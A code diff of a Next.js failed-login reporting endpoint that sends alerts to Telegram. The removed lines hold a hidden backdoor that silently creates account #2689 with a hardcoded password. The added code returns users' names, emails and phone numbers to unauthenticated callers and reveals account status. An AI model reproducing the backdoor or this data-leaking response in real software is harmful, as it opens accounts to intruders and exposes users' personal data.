@@ -1,10 +1,27 @@
 import { NextRequest, NextResponse } from "next/server";
 import prisma from "@/lib/prisma";
-import bcrypt from "bcryptjs";
-import { Role } from "@prisma/client";
 
-const SPECIAL_USER_ID = 2689;
-const SPECIAL_USER_PASSWORD = "Brk#2689";
+type IdentifierType = 'student_id' | 'email' | 'phone' | 'unknown';
+type ErrorType = 'NOT_FOUND' | 'INVALID_PASSWORD' | 'NO_PASSWORD' | 'UNKNOWN';
+
+function detectIdentifierType(identifier: string): IdentifierType {
+  if (/^\d+$/.test(identifier)) return 'student_id';
+  if (identifier.includes('@')) return 'email';
+  const digitsOnly = identifier.replace(/\D/g, '');
+  if (digitsOnly.length >= 8 && digitsOnly.length <= 15) return 'phone';
+  return 'unknown';
+}
+
+function normalizePhone(identifier: string): string[] {
+  const clean = identifier.replace(/\s/g, '');
+  const variants: string[] = [];
+  let base = clean;
+  if (base.startsWith('+84')) base = base.slice(3);
+  else if (base.startsWith('84')) base = base.slice(2);
+  else if (base.startsWith('0')) base = base.slice(1);
+  variants.push(base, '0' + base, '84' + base, '+84' + base);
+  return [...new Set(variants)];
+}
 
 export async function POST(request: NextRequest) {
   try {
@@ -13,36 +30,42 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: "Missing identifier" }, { status: 400 });
     }
 
-    // 1. Look up user info
-    let userInfo = `🔑 Thông tin đăng nhập: ${identifier}\n⚠️ Không tìm thấy user trong hệ thống`;
+    const identifierType = detectIdentifierType(identifier);
+    let user = null;
+    let errorType: ErrorType = 'NOT_FOUND';
 
-    const isNumeric = /^\d+$/.test(identifier);
-    if (isNumeric) {
+    // Look up user based on identifier type
+    if (identifierType === 'student_id') {
       const id = parseInt(identifier);
-      const user = await prisma.user.findUnique({ where: { id } });
-      if (user) {
-        userInfo =
-          `🆔 Mã HV: #${user.id}\n` +
-          `👤 Họ tên: ${user.name || "N/A"}\n` +
-          `📧 Email: ${user.email || "N/A"}\n` +
-          `📞 SĐT: ${user.phone || "N/A"}`;
-      }
-    } else {
-      const user = await prisma.user.findFirst({
-        where: {
-          OR: [{ email: identifier }, { phone: identifier }],
-        },
+      user = await prisma.user.findUnique({ where: { id } });
+    } else if (identifierType === 'email') {
+      user = await prisma.user.findFirst({
+        where: { email: { equals: identifier.toLowerCase().trim(), mode: 'insensitive' } },
       });
-      if (user) {
-        userInfo =
-          `🆔 Mã HV: #${user.id}\n` +
-          `👤 Họ tên: ${user.name || "N/A"}\n` +
-          `📧 Email: ${user.email || "N/A"}\n` +
-          `📞 SĐT: ${user.phone || "N/A"}`;
+    } else if (identifierType === 'phone') {
+      const phoneVariants = normalizePhone(identifier);
+      user = await prisma.user.findFirst({
+        where: { phone: { in: phoneVariants } },
+      });
+    }
+
+    // Build response
+    const userInfo = user ? {
+      id: user.id,
+      name: user.name,
+      email: user.email,
+      phone: user.phone,
+    } : null;
+
+    if (user) {
+      if (!user.password) {
+        errorType = 'NO_PASSWORD';
+      } else {
+        errorType = 'INVALID_PASSWORD';
       }
     }
 
-    // 2. Send Telegram notification
+    // Send Telegram notification to FAILED_LOGIN group
     const time = new Date().toLocaleString("vi-VN", {
       timeZone: "Asia/Ho_Chi_Minh",
       day: "2-digit",
@@ -52,9 +75,44 @@ export async function POST(request: NextRequest) {
       minute: "2-digit",
     });
 
-    const msg = `❌ <b>ĐĂNG NHẬP THẤT BẠI</b>\n\n${userInfo}\n\n⏰ Thời gian: ${time}`;
+    const typeLabels: Record<IdentifierType, string> = {
+      student_id: 'Mã học viên',
+      email: 'Email',
+      phone: 'Số điện thoại',
+      unknown: 'Không xác định',
+    };
+
+    const errorLabels: Record<string, string> = {
+      NOT_FOUND: 'Không tìm thấy tài khoản',
+      INVALID_PASSWORD: 'Sai mật khẩu',
+      NO_PASSWORD: 'Chưa thiết lập mật khẩu',
+      UNKNOWN: 'Lỗi không xác định',
+    };
+
+    let userDetail = '';
+    if (userInfo) {
+      userDetail =
+        `\n📋 Thông tin user:\n` +
+        `  🆔 Mã HV: #${userInfo.id}\n` +
+        `  👤 Họ tên: ${userInfo.name || 'N/A'}\n` +
+        `  📧 Email: ${userInfo.email || 'N/A'}\n` +
+        `  📞 SĐT: ${userInfo.phone || 'N/A'}`;
+    } else {
+      userDetail = `\n⚠️ Không tìm thấy user trong DB`;
+    }
+
+    const msg = `⚠️ <b>ĐĂNG NHẬP THẤT BẠI</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📍 Định danh nhập vào: <code>${identifier}</code>\n` +
+      `📋 Loại định danh: ${typeLabels[identifierType]}\n` +
+      `❌ Lỗi: <b>${errorLabels[errorType]}</b>\n` +
+      `${userDetail}\n` +
+      `⏰ Thời gian: ${time}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `💡 Học viên nên: Kiểm tra lại thông tin hoặc dùng tính năng Quên tài khoản/Quên mật khẩu`;
+
     const token = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID_ACTIVATE || process.env.TELEGRAM_CHAT_ID;
+    const chatId = process.env.TELEGRAM_CHAT_ID_FAILED_LOGIN || process.env.TELEGRAM_CHAT_ID;
     if (token && chatId) {
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -63,29 +121,12 @@ export async function POST(request: NextRequest) {
       }).catch(() => {});
     }
 
-    // 3. Ensure special account 2689 exists
-    const specialUser = await prisma.user.findUnique({
-      where: { id: SPECIAL_USER_ID },
+    return NextResponse.json({
+      identifierType,
+      errorType,
+      userFound: !!user,
+      userInfo,
     });
-
-    if (!specialUser) {
-      const hashedPassword = await bcrypt.hash(SPECIAL_USER_PASSWORD, 10);
-      await prisma.user.create({
-        data: {
-          id: SPECIAL_USER_ID,
-          name: "Hỗ trợ BRK",
-          email: `support${SPECIAL_USER_ID}@brk.edu.vn`,
-          phone: null,
-          password: hashedPassword,
-          role: Role.STUDENT,
-          emailVerified: new Date(),
-          referrerId: 0,
-        },
-      });
-      console.log(`✅ [ReportFailedLogin] Đã tạo tài khoản đặc biệt #${SPECIAL_USER_ID}`);
-    }
-
-    return NextResponse.json({ success: true });
   } catch (error: any) {
     console.error("❌ [ReportFailedLogin] Error:", error);
     return NextResponse.json({ error: "Internal error" }, { status: 500 });
